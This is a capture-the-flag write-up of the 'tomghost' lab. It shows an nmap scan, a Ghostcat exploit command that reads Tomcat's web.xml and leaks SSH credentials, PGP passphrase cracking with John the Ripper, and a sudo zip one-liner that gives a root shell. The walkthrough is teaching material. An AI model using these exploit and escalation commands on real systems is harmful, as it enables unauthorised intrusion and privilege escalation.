# tomghost writeup

Start with a nmap scan: 

<code>

    Nmap scan report for 10.10.252.31
    Host is up (0.065s latency).
    Not shown: 996 closed tcp ports (conn-refused)
    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
    |   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
    |_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
    53/tcp   open  tcpwrapped
    8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
    | ajp-methods: 
    |_  Supported methods: GET HEAD POST OPTIONS
    8080/tcp open  http       Apache Tomcat 9.0.30
    |_http-favicon: Apache Tomcat
    |_http-title: Apache Tomcat/9.0.30
    |_http-open-proxy: Proxy might be redirecting requests
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code>

Now we can navigate to http://10.10.252.31:8080/ to explore the web page. This is just a default tomcat page. 

![web](/tomghost/images/web.png)

Searching online, I found a Tomcat 9.0.30 vulnerability named **ghostcat**, and I try to exploit it using this tool (https://github.com/00theway/Ghostcat-CNVD-2020-10487) to read protected file on the server. 

``python3 ajpShooter.py http://10.10.252.31:8080/ 8009 /WEB-INF/web.xml read``

<code>

    <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
    version="4.0"
    metadata-complete="true">

    <display-name>Welcome to Tomcat</display-name>
    <description>
        Welcome to GhostCat
            skyfuck:8730281lkjlkjdqlksalks
    </description>

</web-app>

</code>

As result, I've obtained an interesting secret key and user pair that I've tried to use for logging into the machine with ssh. 

``ssh skyfuck@10.10.252.31``

![ssh](/tomghost/images/ssh.png)

Now you can find the flag user.txt inside */home/merlin* directory. 

## Privilege escalation

Let's examine files in *skyfuck* home. 

![credential](/tomghost/images/credential.png)

*Pretty Good Privacy (PGP) is an encryption system used for both sending encrypted emails and encrypting sensitive files. Since its invention back in 1991, PGP has become the de facto standard for email security*

So, I've tried to decrypt .pgp file using the key in the same directory, but it unfortunately needs a passphrase. To get them, I've copied these files in my local machine and I've used JohnTheRipper. 

<code>

    /usr/sbin/gpg2john tryhackme.asc > tryhackme.hash

    john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.hash

</code>

After that, you'll obtain the previous passphrase and you'll be able to decrypt file on remote machine. 

These encrypted files contains credentials for a ssh connection as *merlin*. 

After connecting, I ran the command ``sudo -l`` to check for any commands that the user can run with root privileges, and I got the following result:

![sudo-l](/tomghost/images/sudo-l.png)

Then, I've used this exploit to obtain root privileges --> https://gtfobins.github.io/gtfobins/zip/

<code>

    TF=$(mktemp -u)
    sudo zip $TF /etc/hosts -T -TT 'sh #'

</code>

Congratulations! You are root and now you are able to read root.txt flag. 




